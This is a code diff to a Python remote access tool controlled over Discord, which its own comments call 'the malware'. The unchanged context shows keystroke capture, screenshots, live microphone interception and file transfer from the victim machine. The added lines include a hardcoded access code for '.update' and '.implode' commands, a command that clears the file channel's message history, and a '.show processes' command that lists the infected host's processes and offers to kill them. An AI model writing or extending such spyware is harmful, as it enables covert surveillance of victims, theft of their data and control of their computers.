@@ -8,6 +8,7 @@ from pathlib import Path
 from filesplit.split import Split
 from filesplit.merge import Merge
 from itertools import islice
+from psutil import process_iter
 import time
 from getpass import getuser
 import pyaudio
@@ -33,6 +34,13 @@ from resources.misc import *
 ##                                                                           ##
 ###############################################################################
 
+
+
+
+
+
+
+
 # ----------- Begin of config ---------- #
 # - Please check out README.md before  - #
 # -   you change following settings    - #
@@ -50,6 +58,8 @@ channel_ids = {
     'voice': 851570974867849257   # Paste here voice channel ID for realtime microphone intercepting
 }
 
+access_code = 'zaq1@WSX'   # Set access code for ".update" and ".implode" commands that can result in errors shutting down the malware
+
 # -            End of config           - #
 # - Don't change anything below unless - #
 # - you know exacly what are you doing - #
@@ -59,6 +69,7 @@ client = discord.Client(intents=discord.Intents.all())
 ctrl_codes = {'\\x01': '[CTRL+A]', '\\x02': '[CTRL+B]', '\\x03': '[CTRL+C]', '\\x04': '[CTRL+D]', '\\x05': '[CTRL+E]', '\\x06': '[CTRL+F]', '\\x07': '[CTRL+G]', '\\x08': '[CTRL+H]', '\\t': '[CTRL+I]', '\\x0A': '[CTRL+J]', '\\x0B': '[CTRL+K]', '\\x0C': '[CTRL+L]', '\\x0D': '[CTRL+M]', '\\x0E': '[CTRL+N]', '\\x0F': '[CTRL+O]', '\\x10': '[CTRL+P]', '\\x11': '[CTRL+Q]', '\\x12': '[CTRL+R]', '\\x13': '[CTRL+S]', '\\x14': '[CTRL+T]', '\\x15': '[CTRL+U]', '\\x16': '[CTRL+V]', '\\x17': '[CTRL+W]', '\\x18': '[CTRL+X]', '\\x19': '[CTRL+Y]', '\\x1A': '[CTRL+Z]'}
 text_buffor, force_to_send = '', False
 messages_to_send, files_to_send, embeds_to_send = [], [], []
+processes_messages = []
 files_to_merge, expectation, one_file_attachment_message = [[], [], []], None, None
 working_directory = sys.argv[0].split('\\')[:-1]
 
@@ -122,7 +133,7 @@ async def on_raw_reaction_add(payload):
 
 @client.event
 async def on_reaction_add(reaction, user):
-    global tree_messages, messages_from_sending_big_file, expectation, files_to_merge
+    global tree_messages, messages_from_sending_big_file, expectation, files_to_merge, processes_messages
     if user.bot == False:
         try:
             match str(reaction):
@@ -132,15 +143,18 @@ async def on_reaction_add(reaction, user):
                             await i.delete()
                         tree_messages = []
                         os.system('del tree.txt')
+
                 case '📥':
                     if reaction.message.content[:15] == '```End of tree.':
                         await reaction.message.channel.send(file=discord.File('tree.txt'))
                         os.system('del tree.txt')
+
                 case '✅':
                     if len(messages_from_sending_big_file) > 1:
                         for i in messages_from_sending_big_file:
                             await i.delete()
                         messages_from_sending_big_file = []
+
                 case '📤':
                     if expectation == 'onefile':
                         split_v1 = str(one_file_attachment_message.attachments).split("filename='")[1]
@@ -186,7 +200,7 @@ async def on_raw_reaction_remove(payload):
 
 @client.event
 async def on_message(message):
-    global channel_ids, vc, working_directory, tree_messages, messages_from_sending_big_file, files_to_merge, expectation, one_file_attachment_message
+    global channel_ids, vc, working_directory, tree_messages, messages_from_sending_big_file, files_to_merge, expectation, one_file_attachment_message, processes_messages
     if message.author != client.user:
         if message.content == '.ss':
             await message.delete()
@@ -336,10 +350,52 @@ async def on_message(message):
                 reaction_msg = await message.channel.send('||-||\n❗`This command works only on file-related channel:` <#' + str(channel_ids['file']) + '>❗\n||-||'); await reaction_msg.add_reaction('🔴')
 
         elif message.content == '.done':
-            if expectation == 'multiplefiles':
-                files_to_merge[0].append(await message.channel.send('```This files will be uploaded and merged into  ' + '/'.join(working_directory) + '/' + files_to_merge[2] + '  after you react with 📤 to this message, or with 🔴 to cancel this operation```'))
-                await files_to_merge[0][-1].add_reaction('📤')
-                await files_to_merge[0][-1].add_reaction('🔴')
+            await message.delete()
+            if message.channel.id == channel_ids['file']:
+                if expectation == 'multiplefiles':
+                    files_to_merge[0].append(await message.channel.send('```This files will be uploaded and merged into  ' + '/'.join(working_directory) + '/' + files_to_merge[2] + '  after you react with 📤 to this message, or with 🔴 to cancel this operation```'))
+                    await files_to_merge[0][-1].add_reaction('📤')
+                    await files_to_merge[0][-1].add_reaction('🔴')
+            else:
+                reaction_msg = await message.channel.send('||-||\n❗`This command works only on file-related channel:` <#' + str(channel_ids['file']) + '>❗\n||-||'); await reaction_msg.add_reaction('🔴')
+
+        elif message.content == '.clear':
+            await message.delete()
+            if message.channel.id == channel_ids['file']:
+                async for message in client.get_channel(channel_ids['file']).history():
+                    await message.delete()
+            else:
+                reaction_msg = await message.channel.send('||-||\n❗`This command works only on file-related channel:` <#' + str(channel_ids['file']) + '>❗\n||-||'); await reaction_msg.add_reaction('🔴')
+
+        elif message.content[:5] == '.show':
+            if message.content[6:] == 'processes':
+                processes, processes_list = [], []
+                for proc in process_iter():
+                    processes.append(proc.name())
+                processes.sort(key=str.lower)
+                how_many, temp = 1, processes[0]; processes.pop(0)
+                for i in processes:
+                    if temp == i: how_many += 1
+                    else:
+                        if how_many == 1: processes_list.append('``' + temp + '``')
+                        else: processes_list.append('``' + temp + '``   [x' + str(how_many) + ']'); how_many = 1
+                        temp = i
+                total_processes = len(processes)
+                processes = ''
+                reaction_msg = await message.channel.send('```Processes at ' + current_time() + ' requested by ' + str(message.author) + '```')
+                processes_messages.append(reaction_msg)
+                for proc in range(1, len(processes_list)):
+                    if len(processes) < 1800:
+                        processes = processes + '\n**' + str(proc) + ') **' + str(processes_list[proc])
+                    else:
+                        processes += '\n**' + str(proc) + ') **' + str(processes_list[proc])
+                        reaction_msg = await message.channel.send(processes)
+                        processes_messages.append(reaction_msg)
+                        processes = ''
+                reaction_msg = await message.channel.send(processes + '\n Total processes:** ' + str(total_processes) + '**\n```If you want to kill a process, type  .kill <process-number>```')
+                processes_messages.append(reaction_msg)
+                await reaction_msg.add_reaction('🔴')
+
 
         elif expectation == 'onefile':
             split_v1 = str(message.attachments).split("filename='")[1]
@@ -360,7 +416,6 @@ class PyAudioPCM(discord.AudioSource):
 
     def read(self) -> bytes:
         return self.input_stream.read(self.chunks)
-
 
 def start_recording():
     global files_to_send, channel_ids
